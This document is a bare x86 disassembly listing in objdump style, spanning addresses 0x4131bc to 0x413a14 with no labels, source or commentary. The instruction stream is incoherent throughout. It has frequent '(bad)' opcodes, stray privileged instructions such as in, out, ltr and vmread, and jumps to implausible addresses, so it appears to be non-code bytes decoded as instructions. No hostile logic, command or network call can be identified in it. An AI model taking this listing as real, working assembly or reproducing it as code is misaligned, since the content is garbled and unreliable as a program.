  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
